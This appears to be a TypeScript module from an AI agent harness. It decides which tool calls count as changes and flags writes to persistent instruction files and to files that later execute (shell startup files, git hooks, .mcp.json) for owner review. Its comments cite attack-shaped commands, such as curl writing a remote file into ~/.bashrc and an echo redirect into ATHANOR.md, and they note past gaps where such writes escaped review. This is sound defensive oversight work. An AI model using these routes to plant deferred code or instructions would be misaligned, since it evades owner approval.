/**
 * What a call writes, and whether that write is the kind the completion contract has to wait for.
 *
 * Lifted out of tools.ts unchanged. These read as one rule and were four hundred lines apart: a
 * change is what `finish` dates its evidence against, and `writtenPaths` is what decides whether a
 * change landed on the running brief, on prose, or on something with a test to run. The one
 * transcription defect this file exists to prevent is a classifier that answers for one of the two
 * write paths - `file_write` and a redirect inside a script - and not the other.
 *
 * It imports the command classifiers rather than the other way round: judging a `shell` call needs
 * `gitSubcommand`, the package-manager sets and `commandScript`, and nothing in
 * command-classification.ts needs to know what a write is.
 *
 * `tools.ts` re-exports what it always exported, so no caller moved.
 */
import {
  commandInterpreters,
  commandScript,
  consequentialExecutables,
  FILE_WRITING_EXECUTABLES,
  gitConfigWrite,
  gitSubcommand,
  packageInstallCommands,
  packageRemovalCommands,
  packageRemovalExecutables,
  shellWriteTargets,
  SIGNALLING_EXECUTABLES,
  WRITING_GIT_SUBCOMMANDS
} from './command-classification.js';
import { textValue } from './values.js';
import { surfaceActionVerb } from './surface-actions.js';

/** Tools whose successful result is a check, not a change; everything else here changes something. */
const NON_MUTATING_TOOLS = new Set([
  // A question changes nothing on the computer or outside it. Counting it as a change would put it
  // in front of the completion-evidence rule, where the only result after it is the question - which
  // shows nothing about the work, for exactly the reason notify is listed below.
  'ask',
  // Added with the tool and not with the set, which is the whole defect: a transcription read as a
  // change, so one voice memo took a full workspace checkpoint, set mutatedBeyondProse, and sent
  // the model back for a set_acceptance on a job with nothing to build. The transcript sidecar it
  // writes is a .txt beside the recording, which isProsePath already classifies as prose.
  'audio_read',
  'browser_snapshot',
  'code_diagnostics',
  'code_search',
  'compact_context',
  'connector_list',
  'delegate',
  'desktop_observe',
  'document_read',
  'document_search',
  'file_read',
  'files_list',
  'finish',
  'image_read',
  'memory_recall',
  // It sends a line to the owner's own devices and touches nothing else. Counting it as a change
  // would put it in front of the completion-evidence rule, where the only citable result after it
  // is the notice itself - which shows nothing about whether the work it describes actually landed.
  'notify',
  'parallel_web_read',
  'publish_artifact',
  'read_elements',
  'repo_overview',
  'session_search',
  'set_plan',
  'web_search'
]);

/**
 * Whether a successful call changed the computer, the workspace, or something outside it.
 *
 * `finish` uses this to insist that evidence comes from after the last change rather than before
 * it. A shell command is judged on its executable: the point is to catch "edited a file, then cited
 * the search from four steps ago", not to force a second check after every `ls`. A test runner, a
 * compiler or a linter invoked directly is therefore not a mutation, because it is exactly what the
 * rule wants the model to reach for next.
 *
 * An inline `bash -lc` is a mutation whatever it turns out to have run, since nothing here reads a
 * shell script. That is the safe direction for the two other callers, but it means the shell a
 * model checks its work with is itself a change - so `completionVerification` lets a shell result
 * be cited as the observation of its own change. Without that pair, an agent that verifies through
 * the shell, which is most of them, can never ground a completion.
 */
export const isMutatingToolCall = (name: string, args: Record<string, unknown> = {}): boolean => {
  if (name === 'code_diagnostics' && args.action === 'apply') return true;
  if (name === 'project_update') return args.action === 'checkout';
  if (NON_MUTATING_TOOLS.has(name)) return false;
  // Zoom returns captured pixels without sending input or writing a workspace artifact.
  if (name === 'desktop_action' && surfaceActionVerb(args) === 'zoom') return false;
  if (name === 'shell') {
    // Deliberately asymmetric. A command wrongly called a change costs nothing but a second check;
    // a verification command wrongly called a change can never satisfy the rule it is meant to
    // satisfy, and the model would be stuck rejecting its own correct completion. So only
    // recognisable writers count, and an unrecognised executable with no script to run is treated
    // as a check.
    const executable = textValue(args.executable).split('/').pop() ?? '';
    const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
    const lowerArgs = commandArgs.map((argument) => argument.toLowerCase());
    // `git config --global core.hooksPath …` was not a change here while the floor was calling it
    // `external_consequential` and stopping the turn for it - two mechanisms answering the same
    // question about the same call two different ways, which is the one defect this file exists to
    // prevent. It writes `.gitconfig`, and every later git invocation on this computer reads what
    // landed there, so evidence gathered before it does not cover it. A reading `git config` stays
    // a check, which is what keeps the asymmetry above intact: nobody verifies with a write.
    if (executable === 'git')
      return (
        WRITING_GIT_SUBCOMMANDS.has(gitSubcommand(commandArgs) ?? '') ||
        gitConfigWrite(commandArgs) !== null
      );
    if (packageRemovalExecutables.has(executable))
      return lowerArgs.some(
        (argument) =>
          packageInstallCommands.has(argument) ||
          packageRemovalCommands.has(argument) ||
          argument === 'publish'
      );
    // Every other classifier in this file was converted to commandScript and this one was not, so
    // `bash -lc 'echo … >> workspace/ATHANOR.md'` stopped for the owner's review and the identical
    // script handed to the same interpreter on stdin raised no card at all - writtenPaths gates on
    // this predicate, so the durable-instruction rule never saw the path. An interpreter with a
    // script is a writer wherever the script was written down.
    if (commandInterpreters.has(executable)) return commandScript(args).trim().length > 0;
    if (executable === 'sed') return lowerArgs.some((argument) => argument.startsWith('-i'));
    return (
      consequentialExecutables.has(executable) ||
      // Read separately from the set above because `kill`, `killall` and `pkill` LEFT that set -
      // they are not removals of data and the card they were borrowing said they were. They are
      // still changes to this computer, and this clock asks a different question from the card:
      // stopping a process ends whatever it was serving, and an agent that runs `kill -9 <server
      // pid>` and then cites a curl from three calls earlier has cited a result from a machine that
      // no longer exists. Dropping the names from both mechanisms at once would have been the one
      // error this file's own asymmetry names as unrecoverable - a change wrongly called a check.
      // The pair is asserted together in write-classification.test.ts: true here, no card there.
      SIGNALLING_EXECUTABLES.has(executable) ||
      FILE_WRITING_EXECUTABLES.has(executable) ||
      executable.startsWith('mkfs') ||
      ['curl', 'wget', 'gh', 'ssh', 'scp', 'systemctl', 'apt', 'apt-get'].includes(executable)
    );
  }
  if (name === 'process' && args.action === 'describe') return false;
  if (name === 'process' && args.action === 'debug')
    return !['list', 'status', 'stack', 'scopes'].includes(
      String((args.options as { action?: unknown } | undefined)?.action)
    );
  if (name === 'process' && args.action === 'compute')
    return !['list', 'status'].includes(
      String((args.options as { action?: unknown } | undefined)?.action)
    );
  if (['schedule', 'memory', 'skill', 'process'].includes(name))
    return !['list', 'poll', 'log', 'view', 'wait'].includes(textValue(args.action));
  if (name === 'coding_agent')
    return !['describe', 'status', 'review', 'wait'].includes(textValue(args.action));
  return true;
};

/**
 * Files whose contents become instructions in every later task on this computer.
 *
 * Matched on the tail of the path rather than anchored at its front. `resolveInside` in the runner
 * accepts an absolute path that lands inside the workspace exactly as happily as a relative one, so
 * a front-anchored rule recognised `workspace/ATHANOR.md` and missed
 * `/home/athanor/ws-1/workspace/ATHANOR.md` - the same file, written by the same call. A bare
 * `ATHANOR.md` still counts, because `shell` runs in `workspace` by default and that is where a
 * relative redirect lands.
 */
/**
 * Whether a call's only writes are to the running brief.
 *
 * The completion contract demands evidence observed after the last change, which is right for work
 * and wrong for bookkeeping: an agent that finished, cited what it had proved, and then wrote the
 * outcome into workspace/ATHANOR.md had just made a new last change, so its own record-keeping
 * invalidated the evidence it had already gathered. It then read the brief back to satisfy the
 * gate, which proves only that a file it just wrote contains what it wrote.
 *
 * Narrow on purpose: the brief and workspace skills, the same set `isDurableInstructionPath`
 * already names, and only when every path the call wrote is one of them. A call that touched the
 * brief and a source file is still a change to the source file.
 */
/**
 * Files whose correctness nothing can execute: prose, notes, data written to be read.
 *
 * The completion rule demands evidence dated after the last change, and the way to produce it is to
 * observe the change - run the tests, re-read the page, check the exit code. For a research report
 * or a note there is nothing to run, so the only observation available is reading back a file the
 * agent has just written, which proves that a file it wrote says what it wrote. Measured on one
 * research task: a correct answer, a published report, and then about ten more model turns spent
 * proving prose. A write is its own evidence here, exactly as a shell result is its own evidence
 * for a command.
 *
 * Deliberately by extension and not by guessing at content: a `.ts` file is code whatever is in it,
 * and a `.md` file is prose even when it contains a code block.
 */
const PROSE_EXTENSIONS = new Set([
  '.md',
  '.markdown',
  '.mdx',
  '.rst',
  '.txt',
  '.text',
  '.adoc',
  '.asciidoc',
  '.org',
  '.csv',
  '.tsv',
  '.log'
]);

export const isProsePath = (path: string): boolean => {
  const last =
    path
      .toLowerCase()
      .split(/[\\/]+/)
      .filter(Boolean)
      .at(-1) ?? '';
  const dot = last.lastIndexOf('.');
  return dot > 0 && PROSE_EXTENSIONS.has(last.slice(dot));
};

/** True when a call writes files and every one of them is prose. */
export const writesOnlyProse = (name: string, args: Record<string, unknown>): boolean => {
  // Only the two file tools. A shell command is judged on what it ran, and `writtenPaths` casts a
  // deliberately wide net over a script - wide enough that one prose-looking token would speak for
  // the whole command.
  if (name !== 'file_write' && name !== 'file_patch') return false;
  const paths = writtenPaths(name, args);
  return paths.length > 0 && paths.every(isProsePath);
};

export const writesOnlyDurableInstructions = (
  name: string,
  args: Record<string, unknown>
): boolean => {
  const paths = writtenPaths(name, args);
  return paths.length > 0 && paths.every(isDurableInstructionPath);
};

export const isDurableInstructionPath = (path: string): boolean => {
  const segments = path
    .toLowerCase()
    .split(/[\\/]+/)
    .filter((segment) => segment && segment !== '.');
  const last = segments.at(-1) ?? '';
  if (['garden.md', 'athanor.md', 'open_cloud.md', 'agents.md'].includes(last))
    return segments.length === 1 || segments.at(-2) === 'workspace';
  const skills = segments.indexOf('skills');
  if (skills < 0 || skills === segments.length - 1) return false;
  return skills === 0 || segments[skills - 1] === 'workspace';
};

/**
 * Files nothing on this computer reads as prose and something on it later executes.
 *
 * The durable-instruction rule above is about text that becomes *instructions* in a later task.
 * This is the harder case: text that becomes *execution* in a later process, without a model, a
 * task or a card anywhere near it. The agent's `HOME` is `<workspaceRoot>/.home` (execution.ts
 * `agentHome`), and the subscription coding CLIs read out of it - so a written `.bashrc` runs at
 * the next login shell, a written `.git/hooks/pre-commit` runs at the next commit, a written
 * `.gitconfig` alias or `core.hooksPath` runs at the next git invocation of any kind, and a
 * written CLI configuration
 * runs inside a process holding somebody's subscription credentials. Every one of them executes
 * after this task is over and outside every approval this task could have raised, which is why the
 * card these raise is not gated on the turn being tainted: the write is deferred code execution
 * whether or not anything hostile has been read yet.
 *
 * Matched on segments rather than anchored, for the same reason the durable rule is: `~/.bashrc`,
 * `.bashrc`, `../.bashrc` and `/home/athanor/ws-1/.bashrc` are one file written by one call, and a
 * rule that only recognised one spelling is a rule one spelling away from being no rule.
 *
 * TWO SETS, because the reach of the tool decides whether the write can land on the file at all.
 * These eleven are read out of `$HOME` and out of nowhere else: bash and zsh read their startup
 * files from `$HOME`, git reads `.gitconfig` from `$HOME` and `/etc`, and a copy of any of them one
 * directory down is an inert text file. @see `HOME_ONLY_DEFERRED_EXECUTION_FILES` below for why
 * that distinction is not pedantry.
 */
const HOME_ONLY_DEFERRED_EXECUTION_FILES = new Set([
  '.bash_login',
  '.bash_logout',
  '.bash_profile',
  '.bashrc',
  '.gitconfig',
  '.profile',
  '.zlogin',
  '.zlogout',
  '.zprofile',
  '.zshenv',
  '.zshrc'
]);

/**
 * The two that execute wherever they sit.
 *
 * `.gitmodules` is read by `git submodule` in whatever repository holds it, and `.mcp.json` is a
 * project-scoped server list a coding CLI reads from the directory it is run in - and the agent
 * runs those CLIs inside `workspace/`. Neither needs `$HOME` to be anywhere in particular, so both
 * are reachable by every tool and both keep their card everywhere.
 */
const PROJECT_DEFERRED_EXECUTION_FILES = new Set(['.gitmodules', '.mcp.json']);

/**
 * Directories whose whole contents configure a process that runs on its own afterwards: the
 * coding CLIs this computer installs, each of which reads its own directory under the agent's
 * HOME. Named as directories rather than as files because none of them documents a fixed set of
 * filenames, and a rule listing today's would miss tomorrow's.
 */
const DEFERRED_EXECUTION_DIRECTORIES = new Set(['.claude', '.codex', '.opencode']);

/** The same directories spelled the way XDG spells them, as `~/.config/<name>`. */
const XDG_DEFERRED_EXECUTION_DIRECTORIES = new Set(['claude', 'codex', 'opencode']);

/**
 * Whether a written path is one a later, more privileged process executes.
 *
 * `reachesHome` is the caller's answer to a question only the caller can answer: can the tool
 * making this write put bytes at the agent's `$HOME` at all? `shell` can - it is handed a path and
 * a shell, and `~/.bashrc` there is the real one. `file_write`, `file_patch` and `print_pdf`
 * cannot, and the reason is a bound rather than a habit: every path they are given goes through
 * `assertUserDataPath` (services/workspace-runner/src/files.ts), which admits only `workspace/` and
 * `.athanor/artifacts`, refuses anything absolute or stepping up through `..`, and folds a bare
 * name into `workspace/`. `HOME` is `<workspaceRoot>/.home` - at the container root, BESIDE
 * `workspace/` and not inside it (execution.ts `agentHome`, over `AGENT_HOME` in files.ts) - so
 * `file_write('.bashrc')` writes `workspace/.bashrc`, a file no login shell has ever read, and
 * `file_write('../.zshenv')` and `file_write('/home/athanor/ws-1/.bash_profile')` are refused
 * outright before any of this runs.
 *
 * WHAT WOULD BREAK IT is `$HOME` moving back under `workspace/`, which is where the build wave
 * first put it: the fold would then carry `file_write('.home/.bashrc')` to the real login-shell
 * startup file, sourced by the owner's own interactive terminal, with no card and in every
 * security mode. That is closed twice over rather than once, and both halves are load-bearing: the
 * location above puts HOME outside anything a bare name can reach, and `.home` is named in
 * files.ts's `CONTAINER_ONLY`, so the fold refuses that spelling outright instead of quietly
 * answering with an inert `workspace/.home/.bashrc`.
 *
 * Measured before this parameter existed: eleven of the thirteen names in the deferred set were
 * unreachable by those three tools, and the card fired `external_consequential` in every mode on a
 * write nothing on this computer would ever execute. The two that stayed reachable are the two that
 * do not need `$HOME` - see `PROJECT_DEFERRED_EXECUTION_FILES` - along with `.git/hooks/*`,
 * `.git/config` and the coding-CLI directories, all of which a coding CLI or git reads out of the
 * project directory the agent works in. Those keep their card through every tool, and this is why
 * the narrowing is a name split rather than a blanket exemption for the file tools.
 */
export const isDeferredExecutionPath = (path: string, reachesHome = true): boolean => {
  const segments = path
    .toLowerCase()
    .split(/[\\/]+/)
    .filter((segment) => segment && segment !== '.');
  const last = segments.at(-1) ?? '';
  if (PROJECT_DEFERRED_EXECUTION_FILES.has(last)) return true;
  if (reachesHome && HOME_ONLY_DEFERRED_EXECUTION_FILES.has(last)) return true;
  // `.git/hooks/<anything>` is run by git itself, and `.git/config` can point `core.hooksPath` at
  // a directory of the writer's choosing, which is the same fact one level of indirection away.
  // A bare `.git` or a bare `.git/hooks` is not a write to either.
  const git = segments.lastIndexOf('.git');
  if (git >= 0 && git < segments.length - 1) {
    const next = segments[git + 1] ?? '';
    if (next === 'hooks' ? git + 2 < segments.length : next === 'config') return true;
  }
  return segments.some((segment, index) => {
    if (index === segments.length - 1) return false;
    if (DEFERRED_EXECUTION_DIRECTORIES.has(segment)) return true;
    return (
      segment === '.config' &&
      XDG_DEFERRED_EXECUTION_DIRECTORIES.has(segments[index + 1] ?? '') &&
      index + 2 < segments.length
    );
  });
};

/**
 * The one browser action that writes a file: a screenshot, on its own or as a step of a batch. Read
 * off the flat bag the model writes - `action` - and off the nested `type` a turn replays out of
 * its own history, for the reason surface-actions.ts gives for reading both.
 */
const screenshotPaths = (args: Record<string, unknown>): string[] => {
  const verb = textValue(args.action) || textValue(args.type);
  if (verb === 'screenshot') return [textValue(args.path)].filter(Boolean);
  if (verb !== 'batch' || !Array.isArray(args.actions)) return [];
  return args.actions.flatMap((step) =>
    step && typeof step === 'object' ? screenshotPaths(step as Record<string, unknown>) : []
  );
};

export const writtenPaths = (name: string, args: Record<string, unknown>): string[] => {
  if (name === 'code_diagnostics' && args.action === 'apply') {
    const paths = (args.options as { paths?: unknown } | undefined)?.paths;
    return Array.isArray(paths)
      ? paths.filter((item): item is string => typeof item === 'string')
      : [];
  }
  if (name === 'file_write' || name === 'print_pdf') return [textValue(args.path)].filter(Boolean);
  if (name === 'browser_action') return screenshotPaths(args);
  // A redirect writes the brief as surely as file_write does, and the whole point of the durable
  // rule is that the file is read back as a system message in every later task - so a rule that
  // only watched the two file tools was one `bash -lc 'echo ... >> workspace/ATHANOR.md'` away from
  // being no rule. Gated on the command already being classified as a writer, so `cat` on the same
  // path raises nothing: a card that fires on reading the brief is a card the owner stops reading.
  //
  // That gate was the whole of the precision for a long time, and an inline script clears it
  // whatever it turns out to run - so every token of `bash -lc 'cat ~/.bashrc'` arrived here and the
  // deferred-execution rule carded a read. `shellWriteTargets` resolves what the script actually
  // writes; the wide net is what it falls back to when it cannot, which is the same fail-closed
  // answer as before for every shape it cannot read.
  if (name === 'shell') {
    if (!isMutatingToolCall(name, args)) return [];
    const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
    return (
      shellWriteTargets(args) ??
      [...commandArgs, ...commandScript(args).split(/[\s'"`>|;()]+/)].filter(Boolean)
    );
  }
  if (name !== 'file_patch') return [];
  return (Array.isArray(args.patches) ? args.patches : [])
    .map((patch) => textValue((patch as { path?: unknown } | null)?.path))
    .filter(Boolean);
};

/**
 * The tools whose every path the runner folds into `workspace/` or refuses. `browser_action` is
 * here for the one path it ever writes, a screenshot's, which goes through the same boundary as a
 * printed page's. @see isDeferredExecutionPath
 */
const PATH_CONFINED_TOOLS = new Set([
  'file_write',
  'file_patch',
  'print_pdf',
  'browser_action',
  'code_diagnostics'
]);

/**
 * The paths this call leaves for a later, more privileged process to execute.
 *
 * One reader for the floor's deferred-execution card, holding both halves of the same fact: which
 * paths a call writes, and whether the tool writing them can reach the place those names mean
 * something. Kept here rather than in the floor because `writtenPaths` and the deferred set are
 * here, and a rule split across two files is how the durable-instruction rule and this one drifted
 * apart the first time.
 *
 * `desktop_launch` is read with `shell`'s reader, because they are the same act wearing two names -
 * both take an executable and arguments and run them on the owner's computer, and the one that is
 * not `shell` runs as the runner's own account rather than as the sandboxed agent. The floor
 * already says this twice, once for the taint half and once for the destructive, upload and push
 * gates; it was not true here, and `desktop_launch curl -o ~/.bashrc https://x` was measured
 * raising nothing outside review while the identical `shell` call raised
 * `external_consequential`.
 */
export const deferredExecutionPaths = (name: string, args: Record<string, unknown>): string[] => [
  ...new Set(
    writtenPaths(name === 'desktop_launch' ? 'shell' : name, args).filter((path) =>
      isDeferredExecutionPath(path, !PATH_CONFINED_TOOLS.has(name))
    )
  )
];
